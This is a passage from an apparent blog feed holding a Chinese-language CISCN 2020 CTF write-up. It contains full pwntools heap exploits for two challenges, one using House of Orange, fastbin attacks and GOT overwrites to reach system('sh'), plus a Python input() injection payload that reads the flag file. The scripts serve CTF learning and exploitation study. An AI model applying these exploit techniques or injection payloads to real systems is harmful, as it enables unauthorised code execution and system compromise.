class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alloca</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sla(<span class="hljs-string">'len'</span>,str(size))    sa(<span class="hljs-string">'content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-comment"># def pwn():</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    alloca(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">'aa'</span>)    alloca(<span class="hljs-number">1</span>,<span class="hljs-number">0x4f0</span>,<span class="hljs-string">'\xdd\xd5'</span>)    alloca(<span class="hljs-number">2</span>,<span class="hljs-number">0xb0</span>,<span class="hljs-string">'aa'</span>)    alloca(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'aa'</span>)    free(<span class="hljs-number">0</span>)    alloca(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">'/bin/sh\x00'</span>*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">'\xc1'</span>)    free(<span class="hljs-number">1</span>)    alloca(<span class="hljs-number">1</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\xdd\xd5'</span>)    alloca(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x50\x47'</span>)    alloca(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x50\x47'</span>)    alloca(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x50\x47'</span>)    alloca(<span class="hljs-number">7</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aa'</span>)    alloca(<span class="hljs-number">8</span>,<span class="hljs-number">0x160</span>,<span class="hljs-string">'aaaaaa'</span>)    alloca(<span class="hljs-number">9</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'aa'</span>)    alloca(<span class="hljs-number">10</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aa'</span>)    free(<span class="hljs-number">7</span>)    alloca(<span class="hljs-number">0</span>,<span class="hljs-number">0x38</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + <span class="hljs-string">'\xe1'</span>)    free(<span class="hljs-number">8</span>)    free(<span class="hljs-number">4</span>)    free(<span class="hljs-number">9</span>)    free(<span class="hljs-number">5</span>)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x160</span>    alloca(<span class="hljs-number">11</span>,<span class="hljs-number">0x180</span>,payload)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x160</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + <span class="hljs-string">'\x20'</span>    alloca(<span class="hljs-number">11</span>,<span class="hljs-number">0x180</span>,payload)    alloca(<span class="hljs-number">12</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    <span class="hljs-comment"># debug()</span>    alloca(<span class="hljs-number">13</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    alloca(<span class="hljs-number">14</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\xed\xca'</span>)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span> + p64(<span class="hljs-number">0xfbad3c80</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p8(<span class="hljs-number">0</span>)    alloca(<span class="hljs-number">15</span>,<span class="hljs-number">0x60</span>,payload)<span class="hljs-comment"># leak_addr()</span>leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">10</span>)        leak = uu64(r(<span class="hljs-number">6</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        io = process(<span class="hljs-string">'./pwn'</span>)        <span class="hljs-comment"># io = remote('101.200.53.148',34521)</span>        <span class="hljs-keyword">continue</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_base = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)rec = <span class="hljs-number">0xf1207</span> + libc_base<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getshell</span><span class="hljs-params">()</span>:</span>    alloca(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    alloca(<span class="hljs-number">8</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">11</span>)    free(<span class="hljs-number">6</span>)    alloca(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    alloca(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    alloca(<span class="hljs-number">0</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\xed\xca'</span>)    free(<span class="hljs-number">4</span>)    free(<span class="hljs-number">13</span>)    free(<span class="hljs-number">12</span>)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + <span class="hljs-string">'\x90'</span>    alloca(<span class="hljs-number">13</span>,<span class="hljs-number">0x90</span>,payload)    alloca(<span class="hljs-number">11</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x20\xd0'</span>)    alloca(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x20\xd0'</span>)    alloca(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x20\xd0'</span>)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(rec)    alloca(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,payload)    <span class="hljs-comment"># debug()</span>    sleep(<span class="hljs-number">0.1</span>)    <span class="hljs-comment"># alloca(8,30,'1')</span>getshell()itr()</code></pre></div><p>深夜写的exp，估计构造堆块的思路有点混乱。🤣🤣</p><h3 id="babyjsc"><a href="#babyjsc" class="headerlink" title="babyjsc"></a>babyjsc</h3><p>比赛时没有做出来，开始以为是个webpwn，不敢去做。但是很多队伍做出来了，试着去做，看到server.py,不了解jsc，以为只能执行js代码，废了很大精力写js来读取flag，还是没有成功。tcl。</p><p>最后看wp，知道了input函数本身就是个漏洞函数，其会将stdin输入的内容当做python代码去执行（就像执行计算式一样，将其看做python代码，通过计算返回结果）。当然可以用它来执行命令，不过需要先倒入os的模块，然后执行系统命令。</p><div class="hljs"><pre><code class="hljs python">__import__(<span class="hljs-string">'os'</span>).system(<span class="hljs-string">'cat /home/ctf/flag'</span>)</code></pre></div><p>对于python，input函数漏洞，参考链接：<br><a href="https://blog.csdn.net/weixin_34221332/article/details/92713257" target="_blank" rel="noopener">https://blog.csdn.net/weixin_34221332/article/details/92713257</a></p><h3 id="no-free"><a href="#no-free" class="headerlink" title="no free"></a>no free</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><div class="hljs"><pre><code class="hljs python">*] <span class="hljs-string">'/ctf/work/ciscn2020/pwn/nofree/pwn'</span>    Arch:     amd64<span class="hljs-number">-64</span>-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (<span class="hljs-number">0x400000</span>)</code></pre></div><p>可以看到保护开的还是很少的，然后no free 明显需要使用到hos of orange进行攻击了。</p><h5 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h5><ul><li>只能申请0-0x90大小的堆块，堆块号自定义0-2，且由于没有对已经存在的堆块号验证，可以进行无限次的申请同一个序号的堆块。</li><li>堆块地址存在于<code>0x06020C0  + 0x100</code> size 跟在后面。</li><li><code>strdup</code> 相当于<code>malloc(stren(s))</code> </li></ul><h5 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h5><ul><li>倘若输入没有存在的堆块idx，程序会直接返回</li><li><code>read_diy(key[2 * idx + 0x20], (unsigned __int64)key[2 * idx + 0x21]);</code> 这里由于是这样的判断，结合add的<code>strdup</code> 就造成了堆溢出。</li></ul><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>难点基本就在泄漏libc了。</p><ul><li>利用程序的堆溢出漏洞，修改一下top chunk</li><li>申请多次0号0x90的堆块，来消耗修改后的top chunk，到达一定程度后进行hos of orange攻击，获取一个空闲的进入fastbin的堆块</li><li>利用堆溢出，在fastbin chain上加一个<code>0x06020C0  + 0x100</code> ，准备进行fastbin attack，来获取一个在存放堆块地址的堆块，这样就实现了任意地址写。</li><li>修改<code>atoi</code> 的got 表为 printf，创造出一个格式化字符串漏洞</li><li>利用add中的atoi，完成格式化字符串漏洞的利用，泄漏出libc地址</li><li>利用格式化字符串漏洞，修改<code>atoi</code> 的got表为<code>elf.plt[&#39;atoi&#39;] + 6</code> ，让其完成一下解析，重新构造出正常的atoi（原因：测速中发现，用edit功能输入idx后直接退出，只能让其恢复正常，再进行任意地址写）</li><li>修改<code>atoi</code> 的got为system的地址，然后在发送个<code>sh</code> ，完成<code>system(sh)</code></li></ul><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">"content"</span>,str(data))payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x40</span>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,payload)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x40</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xfb1</span>)edit(<span class="hljs-number">0</span>,payload)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x90</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">24</span>):    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,payload)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x10</span>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,payload)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x70</span>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x70</span>,payload)payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x6020C0</span> + <span class="hljs-number">0x100</span>)edit(<span class="hljs-number">1</span>,payload)payload = <span class="hljs-number">0x60</span> * <span class="hljs-string">'a'</span>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x70</span>,payload)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,payload)payload = p64(<span class="hljs-number">0x0000000000602058</span>) + p64(<span class="hljs-number">0x90</span>)edit(<span class="hljs-number">0</span>,payload)edit(<span class="hljs-number">1</span>,p64(elf.plt[<span class="hljs-string">'printf'</span>]))sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)payload = <span class="hljs-string">'aaaa%7$s'</span> + p64(<span class="hljs-number">0x000000000602018</span>)sa(<span class="hljs-string">'idx'</span>,payload)r(<span class="hljs-number">4</span>)r(<span class="hljs-number">4</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - libc.sym[<span class="hljs-string">'puts'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)sys = libc_base + libc.sym[<span class="hljs-string">'system'</span>]sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)payload = <span class="hljs-string">'aaaa%82c'</span> + <span class="hljs-string">'%8$hhn11'</span> + p64(<span class="hljs-number">0x000000000602058</span>)sa(<span class="hljs-string">'idx'</span>,payload)edit(<span class="hljs-number">1</span>,p64(sys))s(<span class="hljs-string">'sh'</span>)itr()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ciscn-2020初赛部分题目&quot;&gt;&lt;a href=&quot;#ciscn-2020初赛部分题目&quot; class=&quot;headerlink&quot; title=&quot;ciscn  2020初赛部分题目&quot;&gt;&lt;/a&gt;ciscn  2020初赛部分题目&lt;/h1&gt;&lt;h2 id=&quot;re&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
</feed>
